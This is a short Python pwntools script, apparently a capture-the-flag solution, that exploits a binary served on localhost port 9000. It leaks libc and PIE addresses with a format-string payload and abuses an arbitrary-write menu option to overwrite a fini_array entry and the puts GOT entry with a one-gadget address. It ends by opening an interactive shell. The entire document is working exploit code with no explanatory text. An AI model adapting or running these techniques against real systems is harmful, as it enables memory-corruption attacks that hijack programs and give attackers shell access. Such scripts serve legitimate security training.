from pwn import *
#p = process("./prob")
p = remote("localhost", 9000)

p.sendline(b"happysmile %23$p %19$p")
p.recvuntil(b"hello happysmile ")

libc_base = int(p.recv(14), 16) - 0x29d90
p.recv(1)
main = int(p.recv(14), 16)
pie_base = main - 0x151e
fini_array = pie_base + 0x33b0 + 0x8

print("[+] LIBC BASE :", hex(libc_base))
print("[+] PIE BASE  :", hex(pie_base))

p.sendlineafter(b">> ", b"2")
p.sendlineafter(b"pwn pwn!", str(fini_array).encode())
p.sendline(str(main).encode())

putsgot = pie_base + 0x35c8
oneshot = libc_base + 0xebc85
print("[+] ONESHOT   :", hex(oneshot))
print("[+] PUTS GOT  :", hex(putsgot))

p.sendlineafter(b": ", b"happysmile")
p.sendlineafter(b">> ", b"2")
p.sendlineafter(b"pwn pwn!", str(putsgot).encode())
p.sendline(str(oneshot).encode())

p.interactive()